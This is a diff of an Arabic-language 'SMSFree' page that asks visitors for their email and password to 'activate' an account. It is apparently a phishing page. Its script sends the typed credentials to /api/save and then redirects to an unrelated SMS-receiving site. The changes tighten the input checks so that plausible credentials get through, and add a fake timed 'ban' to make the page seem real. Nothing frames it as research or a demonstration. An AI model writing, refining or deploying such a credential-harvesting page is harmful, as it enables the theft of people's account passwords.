@@ -1,28 +1,27 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMSFree - نظام الحماية الذكي</title>
+    <title>SMSFree - الحماية المتقدمة</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@600;800&display=swap" rel="stylesheet">
     <style>
-        body { background-color: #0a0e17; color: white; font-family:  Cairo , sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        body { background-color: #0a0e17; color: white; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
         .card { background: #141b2b; padding: 40px; border-radius: 25px; width: 90%; max-width: 380px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
-        .logo { width: 100px; height: 100px; background: #0d121c; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; border: 1px solid #00f2fe; box-shadow: 0 0 15px rgba(0,242,254,0.2); }
+        .logo { width: 100px; height: 100px; background: #0d121c; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; border: 1px solid #00f2fe; }
+        
         input { width: 100%; padding: 15px; margin-bottom: 15px; background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: white; box-sizing: border-box; outline: none; transition: 0.3s; }
-        input:disabled { opacity: 0.5; cursor: not-allowed; background: rgba(0,0,0,0.2); }
+        input:disabled { opacity: 0.4; cursor: not-allowed; filter: grayscale(1); }
         input::placeholder { color: rgba(0, 242, 254, 0.4); }
         
-        #msg { padding: 12px; margin-bottom: 15px; border-radius: 10px; font-size: 13px; display: none; font-weight: bold; }
+        #msg { padding: 12px; margin-bottom: 15px; border-radius: 10px; font-size: 13px; display: none; font-weight: bold; line-height: 1.6; }
         .err { background: rgba(255, 71, 87, 0.1); color: #ff4757; border: 1px solid #ff4757; }
-        .ban { background: #000; color: #ffbc00; border: 2px solid #ffbc00; }
+        .ban { background: #000; color: #ffbc00; border: 2px solid #ffbc00; box-shadow: 0 0 15px rgba(255, 188, 0, 0.2); }
 
-        button { width: 100%; padding: 16px; border: none; border-radius: 12px; background: linear-gradient(135deg, #4facfe, #00f2fe); color: #0a0e17; font-weight: 800; cursor: pointer; font-size: 16px; transition: 0.3s; margin-bottom: 10px; }
-        button:disabled { opacity: 0.3; }
+        button { width: 100%; padding: 16px; border: none; border-radius: 12px; background: linear-gradient(135deg, #4facfe, #00f2fe); color: #0a0e17; font-weight: 800; cursor: pointer; font-size: 16px; transition: 0.3s; }
+        button:disabled { opacity: 0.3; cursor: not-allowed; }
         
-        /* زر الاعتذار الأنيق */
-        #sorryBtn { background: #ffbc00; color: #000; display: none; font-size: 14px; padding: 12px; }
+        #sorryBtn { background: #ffbc00 !important; color: #000 !important; display: none; margin-top: 10px; }
 
         .footer { margin-top: 25px; font-size: 11px; color: #8b9bb4; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 15px; }
     </style>
@@ -38,10 +37,6 @@
             <input type="text" id="email" placeholder="البريد الإلكتروني (example@mail.com)" required>
             <input type="password" id="pass" placeholder="كلمة السر" required>
             
-            <div id="loading" style="display:none; margin-bottom:15px; color:#4facfe;">
-                <span>⌛ جاري التحقق من الهوية...</span>
-            </div>
-
             <button type="submit" id="btn">تفعيل الحساب الآن</button>
             <button type="button" id="sorryBtn">اعتذر.. سأقوم بتصحيح البريد وكلمة السر</button>
         </form>
@@ -53,85 +48,88 @@
 
     <script>
         let fails = 0;
-        let isBanned = false;
-        const form = document.getElementById( loginForm );
-        const m = document.getElementById( msg );
-        const b = document.getElementById( btn );
-        const sBtn = document.getElementById( sorryBtn );
-        const inputs = document.querySelectorAll( input );
+        let isLocked = false;
+        const form = document.getElementById('loginForm');
+        const m = document.getElementById('msg');
+        const b = document.getElementById('btn');
+        const sBtn = document.getElementById('sorryBtn');
+        const inputs = document.querySelectorAll('input');
 
-        form.onsubmit = async (e) => {
+        form.addEventListener('submit', async (e) => {
             e.preventDefault();
-            if (isBanned) return;
+            if (isLocked) return;
 
-            const u = document.getElementById( email ).value;
-            const p = document.getElementById( pass ).value;
+            const u = document.getElementById('email').value.trim();
+            const p = document.getElementById('pass').value.trim();
 
-            if (!u.includes( @ ) || p.length < 6) {
+            // منطق التحقق الصارم
+            const isEmailValid = u.includes('@') && u.includes('.');
+            const isPassValid = p.length >= 6;
+
+            if (!isEmailValid || !isPassValid) {
                 fails++;
-                lockInputs(true);
-                
+                setInputsState(true); // قفل الحقول فوراً
+
                 if (fails === 1) {
-                    showStatus("⚠️ يرجى كتابة البيانات بطريقة صحيحة", "err");
-                    sBtn.style.display = "block";
+                    m.innerText = "⚠️ يرجى كتابة البريد وكلمة السر بطريقة صحيحة";
+                    m.className = "err";
+                    m.style.display = "block";
                     b.style.display = "none";
+                    sBtn.style.display = "block";
                 } else {
-                    startGlobalBan();
+                    triggerHardBan();
                 }
                 return;
             }
 
-            // إرسال البيانات
+            // إرسال البيانات في حال الصحة
             b.disabled = true;
-            m.style.display = "none";
-            document.getElementById( loading ).style.display = "block";
-
+            b.innerText = "⏳ جاري التحقق...";
+            
             try {
-                await fetch( /api/save , {
-                    method:  POST ,
-                    headers: { Content-Type :  application/json },
+                await fetch('/api/save', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ user: u, pass: p })
                 });
-            } catch(e) {}
+            } catch(err) {}
 
-            setTimeout(() => { window.location.href = "https://receive-smss.com/"; }, 2000);
-        };
+            setTimeout(() => {
+                window.location.href = "https://receive-smss.com/";
+            }, 2000);
+        });
 
-        // فك الحظر عند الاعتذار (للمرة الأولى فقط)
+        // وظيفة زر الاعتذار
         sBtn.onclick = () => {
-            lockInputs(false);
+            setInputsState(false);
             sBtn.style.display = "none";
             b.style.display = "block";
             m.style.display = "none";
         };
 
-        function lockInputs(state) {
-            inputs.forEach(input => input.disabled = state);
+        function setInputsState(disabled) {
+            inputs.forEach(i => i.disabled = disabled);
         }
 
-        function showStatus(msg, className) {
-            m.innerText = msg;
-            m.className = className;
-            m.style.display = "block";
-        }
-
-        function startGlobalBan() {
-            isBanned = true;
-            b.disabled = true;
-            b.style.display = "block";
+        function triggerHardBan() {
+            isLocked = true;
             sBtn.style.display = "none";
-            let timeLeft = 60;
-            
-            const timer = setInterval(() => {
-                showStatus(`🚫 لقد تم حظرك بسبب محاولات الخاطئة. فك الحظر بعد ${timeLeft} ثانية`, "ban");
-                timeLeft--;
+            b.style.display = "block";
+            b.disabled = true;
+            let timer = 60;
 
-                if (timeLeft < 0) {
-                    clearInterval(timer);
-                    isBanned = false;
+            const countdown = setInterval(() => {
+                m.innerText = `🚫 لقد تم حظرك بسبب محاولات الخاطئة. فك الحظر بعد ${timer} ثانية`;
+                m.className = "ban";
+                m.style.display = "block";
+                timer--;
+
+                if (timer < 0) {
+                    clearInterval(countdown);
+                    isLocked = false;
                     b.disabled = false;
                     m.style.display = "none";
-                    lockInputs(false);
+                    setInputsState(false);
                     fails = 0;
                 }
             }, 1000);
